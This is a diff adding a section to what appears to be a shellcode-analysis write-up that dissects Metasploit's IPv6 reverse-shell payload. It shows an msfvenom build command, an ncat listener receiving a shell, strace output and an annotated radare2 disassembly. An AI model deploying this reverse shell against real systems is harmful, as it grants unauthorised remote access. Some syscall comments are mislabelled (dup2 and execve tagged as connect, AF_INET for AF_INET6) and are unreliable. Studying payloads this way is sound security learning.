@@ -145,8 +145,181 @@ $ hd linux-x64-exec.raw
 So we're all set. `execve` is executed and it executes `whoami` as intended.
 
 
+linux/x64/shell_reverse_ipv6_tcp
+--------------------------------
+
+Since this is an IPv6 reverse shell let's test it by opening a port and running the shellcode.
+
+    @attacker$ ncat -vl6p 4444
+    Ncat: Version 7.70 ( https://nmap.org/ncat )
+    Ncat: Listening on :::4444
+
+    $ msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=::1 -f elf > linux-x64-shell_reverse_ipv6_tcp
+    $ ./linux-x64-shell_reverse_ipv6_tcp
+
+    @attacker
+    Ncat: Connection from ::1.
+    Ncat: Connection from ::1:55452
+    whoami
+    goncalor
+
+`strace` reveals the following. We immediately see this is very similar to the usual IPv4's reverse shell. The only thing that changes are the arguments to `socket` and `connect`.
+
+    $ strace -b execve ./linux-x64-shell_reverse_ipv6_tcp
+    execve("./linux-x64-shell_reverse_ipv6_tcp", ["./linux-x64-shell_reverse_ipv6_t"...], 0x7ffcc441f000 /* 40 vars */) = 0
+    socket(AF_INET6, SOCK_STREAM, IPPROTO_IP) = 3
+    connect(3, {sa_family=AF_INET6, sin6_port=htons(4444), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "::1", &sin6_addr), sin6_scope_id=0}, 28) = 0
+    dup2(3, 2)                              = 2
+    dup2(3, 1)                              = 1
+    dup2(3, 0)                              = 0
+    execve("/bin/sh", NULL, NULLstrace: Process 7318 detached
+
+This time let's disassemble using [`radare2`][wikipedia_radare2].
+
+    $ r2 -d linux-x64-shell_reverse_ipv6_tcp
+    [0x00400078]> pd
+                ;-- entry0:
+                ;-- rip:
+                0x00400078      6a29           push 0x29                   ; ')' ; 41
+                0x0040007a      58             pop rax
+                0x0040007b      6a0a           push 0xa                    ; 10
+                0x0040007d      5f             pop rdi
+                0x0040007e      6a01           push 1                      ; 1
+                0x00400080      5e             pop rsi
+                0x00400081      31d2           xor edx, edx
+                0x00400083      0f05           syscall
+                0x00400085      50             push rax
+                0x00400086      5f             pop rdi
+            ,=< 0x00400087      eb28           jmp 0x4000b1
+            |   0x00400089      5e             pop rsi
+            |   0x0040008a      6a2a           push 0x2a                   ; '*' ; 42
+            |   0x0040008c      58             pop rax
+            |   0x0040008d      6a1c           push 0x1c                   ; 28
+            |   0x0040008f      5a             pop rdx
+            |   0x00400090      0f05           syscall
+            |   0x00400092      6a03           push 3                      ; 3
+            |   0x00400094      5e             pop rsi
+           .--> 0x00400095      6a21           push 0x21                   ; '!' ; 33
+           :|   0x00400097      58             pop rax
+           :|   0x00400098      ffce           dec esi
+           :|   0x0040009a      0f05           syscall
+           `==< 0x0040009c      e0f7           loopne 0x400095
+            |   0x0040009e      6a3b           push 0x3b                   ; orax
+            |   0x004000a0      58             pop rax
+            |   0x004000a1      99             cdq
+            |   0x004000a2      48bb2f62696e.  movabs rbx, 0x68732f6e69622f ; '/bin/sh'
+            |   0x004000ac      53             push rbx
+            |   0x004000ad      54             push rsp
+            |   0x004000ae      5f             pop rdi
+            |   0x004000af      0f05           syscall
+            `-> 0x004000b1      e8d3ffffff     call 0x400089
+                0x004000b6      0a00           or al, byte [rax]
+                0x004000b8      115c0000       adc dword [rax + rax], ebx
+                0x004000bc      0000           add byte [rax], al
+                0x004000be      0000           add byte [rax], al
+                0x004000c0      0000           add byte [rax], al
+                0x004000c2      0000           add byte [rax], al
+                0x004000c4      0000           add byte [rax], al
+                0x004000c6      0000           add byte [rax], al
+                0x004000c8      0000           add byte [rax], al
+                0x004000ca      0000           add byte [rax], al
+                0x004000cc      0001           add byte [rcx], al
+                0x004000ce      0000           add byte [rax], al
+                0x004000d0      0000           add byte [rax], al
+
+
+First there's `socket`. `strace` already did a good job figuring out which constants are being passed to `socket`.
+
+    socket(int domain, int type, int protocol)
+
+    0x00400078      6a29           push 0x29         ; __NR_socket = 0x29 = 41
+    0x0040007a      58             pop rax
+    0x0040007b      6a0a           push 0xa          ; AF_INET6
+    0x0040007d      5f             pop rdi
+    0x0040007e      6a01           push 1            ; SOCK_STREAM
+    0x00400080      5e             pop rsi
+    0x00400081      31d2           xor edx, edx      ; IPPROTO_IP (default protocol)
+    0x00400083      0f05           syscall
+
+If we didn't have that information we could still figure out the variables. From [`man socket`][man_2_socket] we know the first argument starts with `AF_` and the second with `SOCK_` so we could use python to understand which constants are used:
+
+    $ python
+    >>> import socket
+    >>> [x for x in vars(socket).items() if x[1] == 10 and x[0].startswith("AF")]
+    [('AF_INET6', <AddressFamily.AF_INET6: 10>)]
+    >>> [x for x in vars(socket).items() if x[1] == 1 and x[0].startswith("SOCK")]
+    [('SOCK_STREAM', <SocketKind.SOCK_STREAM: 1>)]
+
+Now the shellcode prepares to call `connect`. The first argument is the file descriptor returned by `socket`. Then there's a `jmp` followed by a `call` and a `pop`. This `call` is basically placing the address `0x004000b6` on the stack which then is popped into RSI, the second argument. So this means the bytes after `call` are in fact the `struct sockaddr` for which a pointer is passed as the second argument to `connect`.
+
+    connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+ 
+        0x00400085      50             push rax         ; fd returned by `socket`
+        0x00400086      5f             pop rdi
+    ,=< 0x00400087      eb28           jmp 0x4000b1
+    |   0x00400089      5e             pop rsi
+    |   ...
+    `-> 0x004000b1      e8d3ffffff     call 0x400089
+        0x004000b6      0a00           or al, byte [rax]           ; AF_INET
+        0x004000b8      115c0000       adc dword [rax + rax], ebx  ; port 4444 and half of sin6_flowinfo
+        0x004000bc      0000           add byte [rax], al
+        0x004000be      0000           add byte [rax], al          ; IPv6 address
+        0x004000c0      0000           add byte [rax], al
+        0x004000c2      0000           add byte [rax], al
+        0x004000c4      0000           add byte [rax], al
+        0x004000c6      0000           add byte [rax], al
+        0x004000c8      0000           add byte [rax], al
+        0x004000ca      0000           add byte [rax], al
+        0x004000cc      0001           add byte [rcx], al
+        0x004000ce      0000           add byte [rax], al          ; sin6_scope_id
+        0x004000d0      0000           add byte [rax], al
+
+From [Beej's Guide to Network Programming][beej_sockaddr_in] we know that the `sockaddr` structure looks like this:
+
+    struct sockaddr_in6 {
+        u_int16_t       sin6_family;   // address family, AF_INET6
+        u_int16_t       sin6_port;     // port number, Network Byte Order
+        u_int32_t       sin6_flowinfo; // IPv6 flow information
+        struct in6_addr sin6_addr;     // IPv6 address
+        u_int32_t       sin6_scope_id; // Scope ID
+    };
+
+So `0x000a` is `AF_INET`; `0x5c11` is the port number, which is 4444 (`socket.ntohs(int("0x5c11", 16))`); `0x00000000` is `flowinfo`; then comes the IPv6 address `0x0000...01` or `::1`; and finally `0x00000000` for `scope_id`. The following instructions end the set up and call `connect`.
+
+    0x00400089      5e             pop rsi           ; struct sockaddr *addr
+    0x0040008a      6a2a           push 0x2a         ; __NR_connect = 0x2a = 42
+    0x0040008c      58             pop rax
+    0x0040008d      6a1c           push 0x1c         ; 28 = sizeof(sockaddr_in6)
+    0x0040008f      5a             pop rdx
+    0x00400090      0f05           syscall
+
+The instructions below call `dup2` on `stdin`, `stdout` and `stderr` such that the all get get connected to the socket. This is done as a loop, as the file descriptors are sequential from 0 to 2.
+
+        0x00400092      6a03           push 3
+        0x00400094      5e             pop rsi
+    .-> 0x00400095      6a21           push 0x21                   ; __NR_connect = 0x21 = 3
+    :   0x00400097      58             pop rax
+    :   0x00400098      ffce           dec esi
+    :   0x0040009a      0f05           syscall
+    `=< 0x0040009c      e0f7           loopne 0x400095
+
+And finally a stack based `execve` is called. RSI is `0x0` after the previous instructions. It's interesting that the second argument to `execve` is null, since the manual states that by convention `argv[0]` should contain the name of the binary. As it seems it's not mandatory (well... it's a "_should_" after all).
+
+    execve(const char *pathname, char *const argv[], char *const envp[])
+
+    0x0040009e      6a3b           push 0x3b                      ; __NR_connect = 0x3b = 59
+    0x004000a0      58             pop rax
+    0x004000a1      99             cdq                            ; rdx = 0
+    0x004000a2      48bb2f62696e.  movabs rbx, 0x68732f6e69622f   ; '/bin/sh'
+    0x004000ac      53             push rbx
+    0x004000ad      54             push rsp
+    0x004000ae      5f             pop rdi
+    0x004000af      0f05           syscall
 
 [man_2_execve]: https://linux.die.net/man/2/execve
+[man_2_socket]: https://linux.die.net/man/2/socket
+[wikipedia_radare2]: https://en.wikipedia.org/wiki/Radare2
+[beej_sockaddr_in]: https://web.archive.org/web/20190202184104/https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
 
 ----
 
